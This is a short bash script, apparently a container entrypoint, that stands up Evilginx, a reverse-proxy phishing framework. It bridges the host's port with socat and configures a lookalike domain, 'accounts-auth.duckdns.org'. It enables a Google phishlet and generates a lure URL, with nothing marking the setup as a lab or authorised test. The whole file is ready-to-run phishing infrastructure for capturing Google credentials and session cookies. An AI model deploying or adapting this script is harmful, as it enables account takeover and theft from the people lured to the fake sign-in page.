#!/bin/bash

# 1. Fetch the public IP address dynamically
# This ensures Evilginx knows its external IP for Let's Encrypt
PUBLIC_IP=$(curl -s https://ipv4.icanhazip.com)
echo "Detected Public IP: $PUBLIC_IP"

# 2. Bridge Render/InstaBox port to Evilginx's port 80
socat TCP-LISTEN:${PORT:-8080},fork TCP:127.0.0.1:80 > /dev/null 2>&1 &

# 3. Start Evilginx in a detached tmux session
tmux new-session -d -s evilginx '/app/evilginx -p /app/phishlets'

# 4. Wait for it to boot
sleep 3

# 5. Send the configuration commands
tmux send-keys -t evilginx "config domain accounts-auth.duckdns.org" C-m

# Set the dynamically fetched public IP
tmux send-keys -t evilginx "config ipv4 external $PUBLIC_IP" C-m

tmux send-keys -t evilginx "phishlets hostname google accounts-auth.duckdns.org" C-m
tmux send-keys -t evilginx "phishlets enable google" C-m
tmux send-keys -t evilginx "lures create google" C-m
tmux send-keys -t evilginx "lures get-url 0" C-m

# 6. Pipe the tmux output to a log file
tmux pipe-pane -t evilginx -o 'cat > /tmp/evilginx.log'

# 7. Keep the container alive
tail -f /tmp/evilginx.log
